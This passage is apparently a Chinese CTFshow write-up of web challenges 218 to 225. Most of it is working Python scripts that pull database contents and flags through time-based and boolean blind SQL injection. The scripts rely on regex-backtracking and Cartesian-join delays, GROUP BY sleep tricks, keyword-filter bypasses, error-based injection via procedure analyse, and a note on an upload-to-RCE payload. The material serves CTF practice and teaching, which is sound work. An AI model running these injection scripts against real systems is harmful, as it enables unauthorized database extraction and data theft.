<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> rpad(<span class="string">'a'</span>,<span class="number">4999999</span>,<span class="string">'a'</span>) <span class="keyword">RLIKE</span> <span class="keyword">concat</span>(<span class="keyword">repeat</span>(<span class="string">'(a.*)+'</span>,<span class="number">30</span>),<span class="string">'b'</span>);</span><br><span class="line">​</span><br><span class="line">正则语法：</span><br><span class="line">. : 匹配任意单个字符</span><br><span class="line">* ： 匹配0个或多个前一个得到的字符</span><br><span class="line">[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。</span><br><span class="line">^ : 匹配开头，如^s匹配以s或者S开头的字符串。</span><br><span class="line">$ : 匹配结尾，如s$匹配以s结尾的字符串。</span><br><span class="line">&#123;n&#125; : 匹配前一个字符反复n次。</span><br><span class="line"></span><br><span class="line">RPAD(str,len,padstr)</span><br><span class="line">用字符串 padstr对 str进行右边填补直至它的长度达到 len个字符长度，然后返回 str。如果 str的长度长于 len'，那么它将被截除到 len个字符。</span><br><span class="line">mysql&gt; SELECT RPAD('hi',5,'?'); -&gt; 'hi???'</span><br><span class="line">​</span><br><span class="line">repeat(str,times)  复制字符串times次</span><br></pre></td></tr></table></figure></div>

<p>所以我们可以利用这个来进行构造延时函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</span><br></pre></td></tr></table></figure></div>

<p>以上代码预估等于<code>sleep(5)</code>效果，具体根据网速和性能判断，利用此性质写将上面的代码更改一下，跑flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'"</span></span><br><span class="line">url = <span class="string">"http://4f04cb91-f6ed-43ce-bc4d-539d9c5b2a7b.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',( concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),0)#</span></span><br><span class="line"><span class="comment">#求表payload = "1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxc'),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and  if(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">0.4</span> <span class="keyword">and</span> end - start &lt; <span class="number">1</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731232314453.png" alt="image-20210731232314453"></p>
<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;屏蔽危险分子</span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    return preg_match(&#39;&#x2F;sleep|benchmark|rlike&#x2F;i&#39;,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<ul>
<li><strong>这题吧RLIKE给禁了，我发现把RLIKE换成LIke一样可以，继续上把代码改一下，不过需要注意跟你家网速有关，网速好，一次flag就对，不好就多对比几下</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) LIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'"</span></span><br><span class="line">url = <span class="string">"http://ea12a2f3-655e-44f2-b249-a95701399f73.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',( concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),0)#</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxca'),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and  if(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end - start)</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">0.22</span> <span class="keyword">and</span> end - start &lt; <span class="number">0.5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;92286539-ff05-4292-bcbf-7ff6fa6e31ab&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210731235226222.png" alt="image-20210731235226222"></p>
<p>第二种思路，鉴于我发现我上面的方法，flag需要多跑几次，而且方法重样，所以想多写一个其他的绕过方法，<strong>笛卡尔积时间延时法</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">笛卡尔积(因为连接表是一个很耗时的操作)</span><br><span class="line">    AxB=A和B中每个元素的组合所组成的集合，就是连接表</span><br><span class="line">    <span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> table_name A, table_name B</span><br><span class="line">    <span class="keyword">select</span> * <span class="keyword">from</span> table_name A, table_name B，table_name C</span><br><span class="line">    <span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> table_name A, table_name B，table_name C  表可以是同一张表</span><br></pre></td></tr></table></figure></div>

<p><strong>也就是换个bypass也而已，跑起来，这次成功率提高了很多，基本一次能跑成功</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e"</span></span><br><span class="line">url = <span class="string">"http://ea12a2f3-655e-44f2-b249-a95701399f73.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',( concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b'),0)#</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxca'),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and  if(substr((select group_concat(flagaabc) from ctfshow_flagxca),&#123;&#125;,1)='&#123;&#125;',(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(i,j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        print(end - start)</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">1.5</span> <span class="keyword">and</span> end - start &lt; <span class="number">5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;92286539-ff05-4292-bcbf-7ff6fa6e31ab&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801002919738.png" alt="image-20210801002919738"></p>
<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><blockquote>
<ul>
<li>和布尔盲注一样，过滤substr，但是还有正则，或者left都可以，我们这里用正则写一个脚本，因为还过滤了concat所以不能用group_concat改用limit</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">"select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f"</span></span><br><span class="line">url = <span class="string">"http://d82b1a0b-aba4-4fed-aa83-62d59d7df4ee.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#1) and if((database())regexp('^ctfshow'),(select count(*) from information_schema.schemata a, information_schema.tables b, information_schema.tables c, information_schema.schemata d, information_schema.schemata e, information_schema.schemata f),0)#</span></span><br><span class="line"><span class="comment">#payload = "1) and if((database())regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and if((select table_name from information_schema.tables where table_schema=database() limit 0,1)regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line"><span class="comment">#payload = "1) and if((select column_name from information_schema.columns where table_schema=database() and table_name='ctfshow_flagxcac' limit 1,1)regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line">payload = <span class="string">"1) and if((select flagaabcc from ctfshow_flagxcac limit 0,1)regexp('^&#123;&#125;'),(&#123;&#125;),0)#"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"ip"</span>: payload.format(flag + j,bypass),</span><br><span class="line">            <span class="string">"debug"</span>: <span class="string">'0'</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span> <span class="keyword">and</span> end - start &lt; <span class="number">5</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801011111531.png" alt="image-20210801011111531"></p>
<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><blockquote>
<ul>
<li>考点是：MySQL利用procedure analyse()函数优化表结构<br>limit后面能跟的也只有这个了似乎</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># http://196cf3fd-f920-4018-a714-662ad61571e9.chall.ctf.show/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</span></span><br><span class="line"></span><br><span class="line">可以参考</span><br><span class="line"><span class="comment"># https://www.jb51.net/article/99980.htm</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">//分页查询</span><br><span class="line">$sql = <span class="keyword">select</span> * <span class="keyword">from</span> ctfshow_user <span class="keyword">group</span> <span class="keyword">by</span> $username;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>不懂group by建议看一下这一篇关于group报错注入<a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html，可以理解一下，因为group" target="_blank" rel="noopener">https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html，可以理解一下，因为group</a> by后面只能跟字段和字符串，所以我们构造字符串，利用<code>concat(sleep(0.10),1)</code>可以成功执行sleep()函数，我们再利用if来条件判断，就可以实现时间盲注，写一个脚本跑一波</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://9a446c1a-4acd-4873-a290-53b36046a7b9.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#查表</span></span><br><span class="line"><span class="comment"># sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#查字段</span></span><br><span class="line"><span class="comment"># sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flaga'"</span></span><br><span class="line"><span class="comment">#查flag</span></span><br><span class="line">sql= <span class="string">"select flagaabc from ctfshow_flaga"</span></span><br><span class="line"><span class="comment">#-------------------------------------------------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">"concat(if(substr((&#123;&#125;),&#123;&#125;,1)='&#123;&#125;',sleep(0.10),0),1)"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#concat(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='c',sleep(0.10),0),1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'u'</span> : payload.format(sql,i,j)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url = url, params = params)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">2</span> <span class="keyword">and</span> end - start &lt; <span class="number">3</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801082210482.png" alt="image-20210801082210482"></p>
<h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><blockquote>
<ul>
<li><strong>这题多了个过滤，将数字全部过滤了，我们可以考虑用true来代替数字，所以这题我发现有两种方式一种是时间盲注（但是延时是20秒），另一种是布尔盲注，这把我们就用布尔速度快。看你喜好。</strong></li>
</ul>
</blockquote>
<p><strong>说一下原理，为什么使用布尔盲注，当if返回这true的时候，执行username就会group by username，数据就会多一些，但是当false就会当做字符串，数据就少一些，上两张图看看</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801103638060.png" alt="image-20210801103638060"></p>
</blockquote>
<p><strong>当if条件为false时，数据回显就少了，根据这个可以布尔盲注</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801103725888.png" alt="image-20210801103725888"></p>
</blockquote>
<p>上脚本布尔，跑的快些，比时间盲注</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generateNum</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="string">'true'</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num<span class="number">-1</span>):</span><br><span class="line">            res += <span class="string">"+true"</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ce009cf2-8652-4737-ba07-b3bfc3bc3a4a.challenge.ctf.show:8080/api/"</span></span><br><span class="line">str = <span class="string">"01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="comment">#--------查表</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span></span><br><span class="line"><span class="comment">#--------查字段</span></span><br><span class="line"><span class="comment">#sql= "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'"</span></span><br><span class="line"><span class="comment">#--------查flag</span></span><br><span class="line">sql= <span class="string">"select flagasabc from ctfshow_flagas"</span></span><br><span class="line"><span class="comment">#*************************************************************************************************************************************************************</span></span><br><span class="line">payload = <span class="string">"if(ascii(substr((&#123;&#125;),&#123;&#125;,true))=(&#123;&#125;),username,false)"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#计数</span></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        result_num=generateNum(i)</span><br><span class="line">        result=generateNum(j)</span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">'u'</span> : payload.format(sql,result_num,result)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res = requests.get(url = url, params = params)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"userAUTO"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#ctfshow&#123;728dd1b0-7547-401d-b358-2d2207f3d13c&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801104156781.png" alt="image-20210801104156781"></p>
<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><blockquote>
<ul>
<li>我以为是输入框注入，没想到是文件注入，有一个君子协议里面可以重置密码robots.txt</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801115756350.png" alt="image-20210801115756350"></p>
<p>登陆之后发现是一个上传点，什么都上传不进去，群里有一个payload.bin，上传就自动生成1.php，就直接是rce了，拿flag</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801122038785.png" alt="image-20210801122038785"></p>
<h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>第一种做法，handle，因为堆叠注入，除了过滤的语句，基本是任意执行</p>
